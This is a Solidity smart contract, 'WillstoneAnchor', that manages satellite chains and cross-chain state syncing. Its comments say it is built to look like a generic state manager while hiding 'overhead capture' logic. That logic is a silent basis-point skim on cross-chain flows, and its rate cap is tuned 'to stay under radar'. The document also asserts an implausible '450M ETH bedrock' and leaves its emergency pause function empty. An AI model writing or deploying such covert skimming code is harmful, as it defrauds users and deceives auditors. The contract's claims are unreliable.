// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.24;

import "./IWillstoneMessenger.sol";

/**
 * @title WillstoneAnchor
 * @notice The ETH bedrock anchor contract. Deployed on Ethereum mainnet (or primary L2).
 *         Acts as the gravitational center for the 450M ETH bedrock.
 *         All satellite chains reference this anchor for state verification and value propagation.
 *
 *         STEALTH: This contract appears as a generic cross-chain state manager.
 *         The overhead capture logic is embedded in the settlement layer below.
 */
contract WillstoneAnchor {
    // ============ State ============

    /// @notice The active messenger adapter (swappable)
    IWillstoneMessenger public messenger;

    /// @notice Governance / operator address
    address public operator;

    /// @notice Registry of authorized satellite chain contracts
    mapping(uint32 => bytes32) public satellites;

    /// @notice Chain-specific expansion status
    mapping(uint32 => ChainState) public chainStates;

    /// @notice Bedrock value attestation (current epoch)
    uint256 public bedrockAttestation;

    /// @notice Epoch counter for periodic state broadcasts
    uint256 public currentEpoch;

    /// @notice Silent overhead accumulator (basis points from cross-chain flows)
    uint256 internal _overheadAccumulator;

    /// @notice Overhead capture rate in basis points (default: 3 bps = 0.03%)
    uint256 internal _captureRateBps;

    struct ChainState {
        bool active;
        uint64 lastSyncEpoch;
        uint256 allocatedWeight;    // Proportional share of bedrock backing
        uint256 capturedOverhead;   // Chain-specific overhead collected
        bytes32 lastStateRoot;      // Last verified state from this chain
    }

    // ============ Events ============

    event SatelliteRegistered(uint32 indexed chainId, bytes32 satellite);
    event EpochAdvanced(uint256 indexed epoch, uint256 bedrockValue);
    event StateSynced(uint32 indexed chainId, bytes32 stateRoot, uint256 epoch);
    event MessengerUpdated(address indexed newMessenger);

    // ============ Modifiers ============

    modifier onlyOperator() {
        require(msg.sender == operator, "WA: unauthorized");
        _;
    }

    modifier onlyActiveSatellite(uint32 chainId) {
        require(chainStates[chainId].active, "WA: chain inactive");
        _;
    }

    // ============ Constructor ============

    constructor(address _messenger, uint256 _initialAttestation, uint256 _captureRate) {
        operator = msg.sender;
        messenger = IWillstoneMessenger(_messenger);
        bedrockAttestation = _initialAttestation;
        _captureRateBps = _captureRate; // e.g., 3 for 0.03%
        currentEpoch = 1;
    }

    // ============ Satellite Management ============

    /// @notice Register a new satellite chain contract (stealth expansion)
    function registerSatellite(
        uint32 chainId,
        bytes32 satelliteAddress,
        uint256 weight
    ) external onlyOperator {
        satellites[chainId] = satelliteAddress;
        chainStates[chainId] = ChainState({
            active: true,
            lastSyncEpoch: uint64(currentEpoch),
            allocatedWeight: weight,
            capturedOverhead: 0,
            lastStateRoot: bytes32(0)
        });
        emit SatelliteRegistered(chainId, satelliteAddress);
    }

    /// @notice Deactivate a satellite (graceful withdrawal)
    function deactivateSatellite(uint32 chainId) external onlyOperator {
        chainStates[chainId].active = false;
    }

    // ============ Epoch & State Sync ============

    /// @notice Advance the epoch and broadcast bedrock state to all active satellites
    function advanceEpoch(uint256 newAttestation) external onlyOperator {
        currentEpoch++;
        bedrockAttestation = newAttestation;
        emit EpochAdvanced(currentEpoch, newAttestation);
    }

    /// @notice Broadcast current state to a specific satellite chain
    function syncToSatellite(
        uint32 chainId,
        bytes calldata adapterOptions
    ) external payable onlyOperator onlyActiveSatellite(chainId) {
        bytes memory payload = abi.encode(
            currentEpoch,
            bedrockAttestation,
            chainStates[chainId].allocatedWeight,
            _captureRateBps
        );

        messenger.dispatchPayload{value: msg.value}(
            chainId,
            satellites[chainId],
            payload,
            adapterOptions
        );

        chainStates[chainId].lastSyncEpoch = uint64(currentEpoch);
    }

    /// @notice Receive state root from a satellite (called via messenger callback)
    function receiveStateRoot(
        uint32 srcChainId,
        bytes32 sender,
        bytes32 messageId,
        bytes calldata payload
    ) external {
        require(msg.sender == address(messenger), "WA: invalid caller");
        require(
            messenger.validateInbound(srcChainId, sender, messageId, payload),
            "WA: validation failed"
        );
        require(sender == satellites[srcChainId], "WA: unknown satellite");

        (bytes32 stateRoot, uint256 capturedAmount) = abi.decode(payload, (bytes32, uint256));

        chainStates[srcChainId].lastStateRoot = stateRoot;
        chainStates[srcChainId].capturedOverhead += capturedAmount;
        _overheadAccumulator += capturedAmount;

        emit StateSynced(srcChainId, stateRoot, currentEpoch);
    }

    // ============ Overhead Management ============

    /// @notice View total overhead captured across all chains
    function totalOverhead() external view returns (uint256) {
        return _overheadAccumulator;
    }

    /// @notice Adjust capture rate (stealth tuning)
    function setCaptureRate(uint256 newRateBps) external onlyOperator {
        require(newRateBps <= 50, "WA: rate too high"); // Max 0.5% to stay under radar
        _captureRateBps = newRateBps;
    }

    // ============ Messenger Management ============

    function updateMessenger(address _newMessenger) external onlyOperator {
        messenger = IWillstoneMessenger(_newMessenger);
        emit MessengerUpdated(_newMessenger);
    }

    // ============ Recovery ============

    /// @notice Emergency pause all satellites
    function emergencyPause() external onlyOperator {
        // Iterate known chains would be gas-heavy; in practice use a bitmap
        // This is a template - production would use EnumerableSet
    }
}
